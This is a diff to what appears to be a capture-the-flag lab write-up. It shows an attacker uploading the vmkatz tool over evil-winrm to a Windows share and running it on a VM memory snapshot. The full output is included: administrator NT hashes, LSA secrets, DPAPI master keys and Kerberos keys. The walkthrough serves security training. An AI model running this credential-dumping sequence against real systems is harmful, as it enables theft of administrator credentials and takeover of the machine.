@@ -508,6 +508,78 @@ I can read into this share
 
 https://github.com/nikaiw/VMkatz/releases
 
+```python
+evil-winrm-py PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> upload vmkatz.exe C:\Temp\
+Uploading /home/kali/htb/checkpoint/vmkatz.exe: 2.69MB [00:05, 532kB/s]                                                                                                                                                            
+[+] File uploaded successfully as: C:\Temp\vmkatz.exe
+evil-winrm-py PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> C:\Temp\vmkatz.exe "Windows Server 2019-Snapshot1.vmsn"
+
+[+] SAM Hashes:
+  RID: 500   Administrator         NT:f29e9c014295b9b32139b09a2790be3b
+  RID: 501   Guest                 NT:00000000000000000000000000000000  (DISABLED, NO PASSWORD)
+  RID: 503   DefaultAccount        NT:00000000000000000000000000000000  (DISABLED, NO PASSWORD)
+  RID: 504   WDAGUtilityAccount    NT:28f8d934dee90b2ec824351cb0844479  (DISABLED)
+
+[+] LSA Secrets:
+  DPAPI_SYSTEM
+    user_key:    914b2bd39adf134401ec6eceb08f8ec131d2ecbd
+    machine_key: 77d90ebac2487f870a26e4776c72b4509b06dd1b
+  NL$KM
+    key: 0e421c8e384f72e38169dd54e29255fa6c319978314c9e6a7fb9f92606ac7bffeb8a9509446e3a5262b1c2f766b0c353673029e7a3f3776a886970a69ab46f40
+
+[+] 3 logon session(s), 2 with credentials (1 empty sessions hidden, use -a to show):
+
+  LUID: 0x3e4 (NETWORK SERVICE)
+  Session: 5 | LogonType: Service
+  Username: WIN-0DG6SJAEUTA$
+  Domain: WORKGROUP
+  LogonTime: 2026-05-10 02:34:22 UTC
+  SID: S-1-5-20
+  [Kerberos]
+    DES_CBC_CRC: 3a997d283fc46da0
+    RC4_HMAC_EXP: 3a997d283fc46da0bd689ee00614a24d
+  [DPAPI]
+    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
+    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
+    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
+  [DPAPI]
+    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
+    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
+    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
+  [DPAPI]
+    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
+    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
+    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d
+
+  LUID: 0x14016d
+  Session: 2 | LogonType: Unknown
+  Username: Administrator
+  Domain: WIN-0DG6SJAEUTA
+  LogonServer: WIN-0DG6SJAEUTA
+  LogonTime: 2026-05-09 14:07:14 UTC
+  SID: S-1-5-21-2823729479-30462974-3865623546-500
+  [MSV1_0]
+    NT Hash : f29e9c014295b9b32139b09a2790be3b
+    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
+    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
+  [Kerberos]
+  [DPAPI]
+    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
+    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
+    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595
+
+[*] vmkatz v1.5.2
+[*] System discovery: 15.5706827s
+[*] Process enumeration: 4.1015ms
+[*] Recovering registry hives via CM hive-map...
+[+] Bootkey: 75247bc64fa0086d2c98744d4bcd53f5
+[*] Credential extraction: 108.4853ms
+[*] 3 sessions, 1 NT hashes, 0 plaintext passwords
+evil-winrm-py PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics>
+```
+
+Then ill just run it 
+
 
 
 
